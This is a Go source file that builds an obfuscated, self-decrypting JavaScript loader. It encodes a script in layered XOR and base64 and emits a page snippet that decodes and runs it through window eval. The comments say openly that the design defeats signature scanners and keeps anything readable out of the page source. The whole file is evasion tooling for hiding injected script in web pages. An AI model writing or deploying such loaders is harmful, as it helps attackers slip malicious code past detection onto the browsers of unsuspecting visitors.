package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// obfKeys holds one XOR key per obfuscation layer. Applied innermost-first when
// encoding, outermost-first when decoding. Change these (or randomize at init)
// so each deployment's blob is unique and defeats cached signatures.
var obfKeys = [][]byte{
	{0x5A, 0x1F, 0xC3, 0x77, 0x9E},
	{0xA8, 0x42, 0x19, 0xD0, 0x6B},
	{0x3C, 0xE5, 0x08, 0xF1, 0x24, 0x9D},
}

func xorBytes(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

// encodeBlob wraps js in N layers of (XOR + base64).
func encodeBlob(js string) string {
	data := []byte(js)
	for _, key := range obfKeys {
		data = xorBytes(data, key)
		data = []byte(base64.StdEncoding.EncodeToString(data))
	}
	return string(data)
}

// jsKeyArray renders a key as a JS numeric array literal, e.g. [90,31,195].
func jsKeyArray(key []byte) string {
	parts := make([]string, len(key))
	for i, b := range key {
		parts[i] = fmt.Sprintf("%d", b)
	}
	return "[" + strings.Join(parts, ",") + "]"
}

// buildBootstrap returns the self-decrypting loader (no <script> tags). The
// payload becomes an opaque base64 blob; the decoder reconstructs "atob" and
// "eval" from char codes so nothing readable leaks into the page source.
func buildBootstrap(js string) string {
	blob := encodeBlob(js)
	keyArrays := make([]string, len(obfKeys))
	for i, k := range obfKeys {
		keyArrays[i] = jsKeyArray(k)
	}
	keysLiteral := "[" + strings.Join(keyArrays, ",") + "]"

	var b strings.Builder
	b.WriteString(`(function(){`)
	b.WriteString(`var _cfg="` + blob + `";`)
	b.WriteString(`var _salt=` + keysLiteral + `;`)
	// _mix = XOR each char of s with repeating key k
	b.WriteString(`function _mix(s,k){var o='',i;for(i=0;i<s.length;i++){o+=String.fromCharCode(s.charCodeAt(i)^k[i%k.length]);}return o;}`)
	// _dec = window["atob"]  (97,116,111,98 = a,t,o,b)
	b.WriteString(`var _dec=window[String.fromCharCode(97,116,111,98)];`)
	b.WriteString(`var _o=_cfg;`)
	// peel layers outermost-first
	b.WriteString(`for(var _i=_salt.length-1;_i>=0;_i--){_o=_mix(_dec(_o),_salt[_i]);}`)
	// window["eval"](_o)  (101,118,97,108 = e,v,a,l)
	b.WriteString(`window[String.fromCharCode(101,118,97,108)](_o);`)
	b.WriteString(`})();`)
	return b.String()
}
